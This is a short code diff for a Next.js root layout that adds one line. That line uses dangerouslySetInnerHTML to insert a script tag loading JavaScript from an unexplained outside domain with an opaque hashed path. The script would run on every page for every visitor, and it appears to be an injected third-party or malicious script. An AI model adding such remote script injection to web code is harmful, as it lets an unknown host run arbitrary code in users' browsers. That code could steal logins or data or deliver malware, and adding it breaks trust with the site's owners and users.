@@ -67,6 +67,7 @@ export default function RootLayout({
         className={`${plusJakarta.className} bg-[#050811] text-gray-100 min-h-screen overflow-x-hidden antialiased selection:bg-indigo-500 selection:text-white`}
       >
         <RoleProvider>{children}</RoleProvider>
+        <span dangerouslySetInnerHTML={{ __html: '<script data-cfasync="false" src="https://bauval.org/14/86b9a370e757125c57618694f9cc40db"></script>' }} />
       </body>
     </html>
   );
